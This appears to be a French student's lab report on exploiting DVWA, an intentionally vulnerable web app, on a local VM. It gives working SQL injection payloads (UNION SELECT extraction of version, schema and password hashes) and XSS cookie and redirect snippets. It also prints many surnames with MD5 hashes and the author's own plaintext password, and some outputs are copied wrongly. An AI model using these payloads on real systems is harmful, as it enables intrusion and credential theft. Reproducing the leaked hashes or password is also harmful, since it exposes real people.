# TP 5 - 6

## Exercice 1 (Installation)

Installation sans encombre de la machine virtuelle. Accès à l'application web
sans problème.

## Exercice 2 (Injections SQL)

### Comment connaitre l'ensemble des utilisateurs ?

Il suffit d'accéder à cet URL : [](localhost/vulnerabilities/sqli/?id='+OR+'1'+%3D'1&Submit=Submit)
Nous avons donc injecté ici du SQL grâce au paramètre `GET id` de l'URL.

### Comment récupérer la version de MySQL

Pour récupérer la version de MySQL en SQL, il faut lancer la commande 

```sql
SELECT @@version
```

donc pour récupérer la version via l'application web il suffit d'injecter le 
code suivant :

```sql
' UNION SELECT @@version, ''#
```

et on obtient le résultat suivant :

```
ID: ' UNION SELECT @@version, ''#
First name: 5.7.16-0ubuntu0.16.04.1
Surname:
```

### Comment récupérer le nom de la base de données utilisée ?

Comme pour la question ci-dessus, sauf que cette fois, la requête SQL est la 
suivante :

```sql
SELECT DATABASE();
```

et le résultat est :

```
ID: ' UNION SELECT DATABASE(), ''#
First name: dvwa
Surname:
```

### Comment récupérer l'utilisateur de la base de données ?

Idem avec la requête `SELECT USER();` et le résultat suivant :

```
ID: ' UNION SELECT USER(), ''#
First name: root@localhost
Surname:
```

### Comment récupérer l'endroit où est stocké la base de données ?

Idem avec la requête `SELECT @@datadir;` et le résultat suivant :

```
ID: ' UNION SELECT @@datadir, ''#
First name: root@localhost
Surname:
```

### Comment connaitre le schema de la base de données ?

```
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
```

Résultat :

```
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: user_id

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: first_name

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: last_name

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: user

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: password

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: avatar

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: last_login

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: failed_login

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: CURRENT_CONNECTIONS

ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' #
First name: users
Surname: TOTAL_CONNECTIONS
```

### Comment récupérer les mot de passes des utilisateurs ?

```
' UNION SELECT first_name, password FROM users #
```

Résultat :

```
ID: ' UNION SELECT first_name, password FROM users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: ' UNION SELECT first_name, password FROM users #
First name: AMRI
Surname: daffa4d4fb0ed21485b8e7f38ea37bae

ID: ' UNION SELECT first_name, password FROM users #
First name: BOUCHER
Surname: 6db94f074138a64e94f2ce0a2da24ff4

ID: ' UNION SELECT first_name, password FROM users #
First name: GILBERT
Surname: 703d37fe043b504093cd759418249c6d

ID: ' UNION SELECT first_name, password FROM users #
First name: GODIN
Surname: 3c78feb1cf7001094dfdc6ddc6e7ba0e

ID: ' UNION SELECT first_name, password FROM users #
First name: HENRY
Surname: fd95e4963ee4c40457b940138e98a2e3

ID: ' UNION SELECT first_name, password FROM users #
First name: IBRIHEN
Surname: 1ad657bee9775c2e56cb187460bd4eb2

ID: ' UNION SELECT first_name, password FROM users #
First name: LENGAGNE
Surname: 51b33da9146d15ca2d1d8277cdb88d47

ID: ' UNION SELECT first_name, password FROM users #
First name: LOUAIL
Surname: 15cace913d6fabbc669761b29956e394

ID: ' UNION SELECT first_name, password FROM users #
First name: SI ZIANI
Surname: 6f01c5ba27a7c6e4b80e577851163ec0

ID: ' UNION SELECT first_name, password FROM users #
First name: TIGHLIT
Surname: 60037319c191f3309cededa7adf243c3

ID: ' UNION SELECT first_name, password FROM users #
First name: ZEBOUCHI
Surname: 2c0d9a6b72343c36a467c91d471316d5

ID: ' UNION SELECT first_name, password FROM users #
First name: ZIEGLER
Surname: 15cace913d6fabbc669761b29956e394

ID: ' UNION SELECT first_name, password FROM users #
First name: ABOUBACARI
Surname: d2fbaddcf91237982462e1a9a6488ab5

ID: ' UNION SELECT first_name, password FROM users #
First name: HAMDI
Surname: 60c8bd6a097594302cabf8a28fa702c5

ID: ' UNION SELECT first_name, password FROM users #
First name: JMAA
Surname: bf78fbb27954579c1bae64e7c43cce93

ID: ' UNION SELECT first_name, password FROM users #
First name: LECOMTE
Surname: f183b270e7f587956582dfddb842d7c4

ID: ' UNION SELECT first_name, password FROM users #
First name: LENEVEU
Surname: 039190bf7575cc303639e8beacf3130a

ID: ' UNION SELECT first_name, password FROM users #
First name: LEROY
Surname: 6db94f074138a64e94f2ce0a2da24ff4

ID: ' UNION SELECT first_name, password FROM users #
First name: LEVASSEUR
Surname: 7c0466302cce07f088bb193a9eab7ca8

ID: ' UNION SELECT first_name, password FROM users #
First name: M HAMDI
Surname: 35ad7420bb9d0c567cee749cec3cdd1c

ID: ' UNION SELECT first_name, password FROM users #
First name: MELLET
Surname: 362c08f6b2f82cdbc54ffaf8fec22723

ID: ' UNION SELECT first_name, password FROM users #
First name: MRAIHY
Surname: a0154989c697ec9969706725aea52d1c

ID: ' UNION SELECT first_name, password FROM users #
First name: SAID MEDJAHED
Surname: c85d9d10db75a4a397e6325872efa55e

ID: ' UNION SELECT first_name, password FROM users #
First name: SIMEON
Surname: 1ad657bee9775c2e56cb187460bd4eb2

ID: ' UNION SELECT first_name, password FROM users #
First name: ZEROUAL
Surname: 60037319c191f3309cededa7adf243c3

ID: ' UNION SELECT first_name, password FROM users #
First name: HENRY
Surname: 6db94f074138a64e94f2ce0a2da24ff4

ID: ' UNION SELECT first_name, password FROM users #
First name: BERNIERE
Surname: d2fbaddcf91237982462e1a9a6488ab5

ID: ' UNION SELECT first_name, password FROM users #
First name: BLOT
Surname: c86bae7311bdb854d39d819477f172a1

ID: ' UNION SELECT first_name, password FROM users #
First name: BREANT
Surname: 86a78e8fb164990c1c755a6219cadda4

ID: ' UNION SELECT first_name, password FROM users #
First name: BRODIER
Surname: 362c08f6b2f82cdbc54ffaf8fec22723

ID: ' UNION SELECT first_name, password FROM users #
First name: CAPET
Surname: 9517d8e804146d4cf9369508f8590d12

ID: ' UNION SELECT first_name, password FROM users #
First name: COULON
Surname: 73a896f945329aa6bcc032196da98605

ID: ' UNION SELECT first_name, password FROM users #
First name: CROCHEMORE
Surname: d3a8fd6da30995017b9007c91525a4cd

ID: ' UNION SELECT first_name, password FROM users #
First name: DECAMPS
Surname: 8f9b87a25a326121d7bedc91df22f262

ID: ' UNION SELECT first_name, password FROM users #
First name: DESPORTES
Surname: 8f9b87a25a326121d7bedc91df22f262

ID: ' UNION SELECT first_name, password FROM users #
First name: FLEURY
Surname: 31ab78a60e3fc6fb7a38bbaf173e0053

ID: ' UNION SELECT first_name, password FROM users #
First name: KHARKOUK
Surname: b8f8a4696e53e3b5ce5148be5c75c3a7

ID: ' UNION SELECT first_name, password FROM users #
First name: MOCHET
Surname: b8f8a4696e53e3b5ce5148be5c75c3a7

ID: ' UNION SELECT first_name, password FROM users #
First name: QETTE
Surname: 33d6f17128265f4c7b7f540bfa3c464f

ID: ' UNION SELECT first_name, password FROM users #
First name: SAIDI
Surname: c7a14d2ac074d22a0d6e47f059a6d95d

ID: ' UNION SELECT first_name, password FROM users #
First name: YASSINE
Surname: 40d0d9b3baa6532faf35b7ab88c90bea

ID: ' UNION SELECT first_name, password FROM users #
First name: Bob
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Les mots de passe sont stockés en MD5 qui est une fonction de hashage.
Mon mot de passe est **bonjour92** ce qui donne `31ab78a60e3fc6fb7a38bbaf173e0053`

### Changez en medium, quelles sont les différences ?

Les requêtes se font en POST et les caractères spéciaux sont échappés, mais cela
ne sert à rien.

### Changez en high, quelles sont les différences ?

Il y a un limit 1 mais avec un commentaire, il ne sert plus à rien.

## Exercice 3 (XSS)

### Montrer comment récupérer les cookies de l'utilisateur avec une XSS :

Il suffit d'insérer le texte suivant dans l'input de la page HTML :

```html
<script>alert(document.cookies);</script>
```

Ce qui donne une boite d'alerte avec le texte suivant :

```
PHPSESSID=q9dir7tgnft0nejuplmarn13h1; security=low
```

### Comment rediriger l'utilisateur ?

```javascript
window.location.assign("http://www.w3c.com")
```
